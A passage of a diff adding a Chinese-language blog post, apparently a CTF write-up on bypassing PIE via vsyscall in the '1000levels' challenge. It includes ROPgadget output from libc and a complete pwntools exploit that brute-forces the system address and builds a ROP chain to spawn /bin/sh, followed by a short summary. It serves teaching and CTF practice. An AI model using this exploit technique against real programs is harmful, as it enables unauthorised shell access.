+    mov rdi, PROG   ; char *prog (program path)
+    mov rsi, 0      ; char **agcv
+    mov rdx, 0      ; char **env
+    syscall</code></pre><p>PROG:   DB “/bin/sh”, 0</p>
+</blockquote>
+<p>如下使用 ROPgadget</p>
+<pre><code class="bash">$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep rdi
+0x00000000000221a3 : pop rdi ; pop rbp ; ret
+0x000000000002155f : pop rdi ; ret
+0x000000000005b4fd : pop rdi ; ret 0x38
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep rax
+0x0000000000150077 : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
+0x0000000000021351 : pop rax ; pop rbx ; pop rbp ; ret
+0x00000000001663b1 : pop rax ; pop rdx ; pop rbx ; ret
+0x00000000000439c8 : pop rax ; ret
+0x00000000001cf9a0 : pop rax ; ret 0
+0x00000000001c7788 : pop rax ; ret 0xffe8
+0x000000000003506c : pop rax ; ret 0xfffe
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep rsi
+0x00000000001306d9 : pop rdx ; pop rsi ; ret
+0x00000000000221a1 : pop rsi ; pop r15 ; pop rbp ; ret
+0x000000000002155d : pop rsi ; pop r15 ; ret
+0x000000000007dd2e : pop rsi ; pop rbp ; ret
+0x0000000000023e6a : pop rsi ; ret
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot; | grep rdx
+0x00000000001663b1 : pop rax ; pop rdx ; pop rbx ; ret
+0x00000000001306b4 : pop rdx ; pop r10 ; ret
+0x000000000011c65c : pop rdx ; pop rbx ; ret
+0x0000000000103cc9 : pop rdx ; pop rcx ; pop rbx ; ret
+0x00000000001306d9 : pop rdx ; pop rsi ; ret
+0x0000000000001b96 : pop rdx ; ret
+0x0000000000100972 : pop rdx ; ret 0xffff
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;syscall&quot;
+Gadgets information
+============================================================
+0x00000000000013c0 : syscall</code></pre>
+<p>都拿到偏移值后，根据爆破出的 system 地址，计算各自的实际地址</p>
+<p>poc如下</p>
+<pre><code class="python">
+from pwn import *
+
+prog = process(&quot;./1000levels&quot;)
+
+#context.log_level = &quot;debug&quot;
+debug = 0
+
+def cHint():
+    #prog.sendlineafter(&quot;Choice:&quot;, &quot;2&quot;)
+    prog.recvuntil(&quot;Choice:\n&quot;)
+    prog.sendline(&quot;2&quot;)
+
+def cGo(first, more):
+    #prog.sendlineafter(&quot;Choice:&quot;, &quot;1&quot;)
+    prog.recvuntil(&quot;Choice:\n&quot;)
+    prog.sendline(&quot;1&quot;)
+    #prog.sendlineafter(&quot;levels?&quot;, str(first))
+    prog.recvuntil(&quot;How many levels?\n&quot;)
+    prog.sendline( str(first) )
+    #prog.sendlineafter(&quot;more?&quot;, str(more))
+    prog.recvuntil(&quot;Any more?\n&quot;)
+    prog.sendline( str(more) )
+
+def calc(num):
+    #print prog.recvuntil(&quot;Answer:&quot;)
+    prog.sendafter(&quot;Answer:&quot;, num)
+
+def leak():
+    start = 0x700000000440 # 000000000004f440 T __libc_system
+    for i in range(10, 2, -1):
+        for j in range(15, -1, -1):
+            cHint() # call hint
+            addr_test = (1 &lt;&lt; (i * 4)) * j + start # 
+            cGo(0, -addr_test)
+
+            coward = prog.recvline()
+
+            if &quot;Coward\n&quot; not in coward:
+                start = addr_test
+                #print coward
+                print &quot;[-] checking &quot; + hex(addr_test)
+                break
+        # system - addr_test &gt; 0x1000
+        print &quot;[-] answering...&quot;
+        for i in range(999):
+            calc( p64(0)*5 )
+        # return _start() -&gt; ???
+        #gdb.attach(prog)
+        calc( p64(0xffffffffff600400) * 35 )
+        sleep(0.1)
+
+    return start + 0x1000
+
+if debug:
+    gdb.attach(prog)
+
+
+system_addr = leak()
+print &quot;[+] get system addr:&quot; + hex(system_addr)
+
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+system_addr_libc = libc.symbols[&#39;system&#39;]
+bin_sh_addr_libc = next(libc.search(&quot;/bin/sh&quot;))
+#0x7fffffffdcc0:    0x0000000000000000    0x0000000000000000
+bin_sh_addr = system_addr - system_addr_libc + bin_sh_addr_libc
+# 0x000000000002155f : pop rdi ; ret
+rdi = system_addr - system_addr_libc + 0x000000000002155f # bin_sh_addr
+# 0x00000000000439c8 : pop rax ; ret
+rax = system_addr - system_addr_libc + 0x00000000000439c8 # 0x3b
+# 0x0000000000001b96 : pop rdx ; ret
+rdx = system_addr - system_addr_libc + 0x0000000000001b96 # 0
+# 0x0000000000023e6a : pop rsi ; ret
+rsi = system_addr - system_addr_libc + 0x0000000000023e6a # 0
+# 0x00000000000013c0 : syscall
+#syscall_addr = system_addr - system_addr_libc + 0x000000000011b820 + 23
+syscall_addr = system_addr - system_addr_libc + 0x00000000000013c0
+
+poc = &quot;A&quot;*0x38 + p64(rdi) + p64(bin_sh_addr) + p64(rax) + p64(0x3b) + p64(rdx) + p64(0) + p64(rsi) + p64(0) + p64(syscall_addr)
+
+cGo(1, 0)
+#gdb.attach(prog)
+calc(poc)
+
+prog.interactive()</code></pre>
+<p>pwntools 中 sendlineafter 类似的函数慎用，被坑了好几个小时23333</p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>利用-1 里面的方法很简单无脑，利用-2 里面需要函数逻辑支持需要比较强的逻辑思维，不过两者都利用了 vsyscall 当作滑板直接到达利用点，与此同时呢还需要知道 vsyscall 函数当中虽然存在 <code>syscall</code> 指令，但是存在检查机制，<strong>不允许直接转到 vsyscall 代码块中除了函数入口地址之外的任意地址</strong></p>
+<p>与此同时，虽然 vDSO 是动态地址，但是它没有 vsyscall 那样的限制，其中的指令可以任意执行，不需要从入口开始，所以有时候我们能够通过 vDSO 来进行一些利用</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-常用命令"><span class="toc-number">2.</span> <span class="toc-text">0x01 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-流程分析"><span class="toc-number">3.</span> <span class="toc-text">0x02 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-利用-1"><span class="toc-number">4.</span> <span class="toc-text">0x03 利用-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-利用-2"><span class="toc-number">5.</span> <span class="toc-text">0x04 利用-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-总结"><span class="toc-number">6.</span> <span class="toc-text">0x05 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&text=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&is_video=false&description=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PIE BYPASS 2-vsyscall&body=Check out this article: http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&title=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&name=PIE BYPASS 2-vsyscall&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/01/05/PIE-BYPASS-2-vsyscall/&t=PIE BYPASS 2-vsyscall" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 zndetcl
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
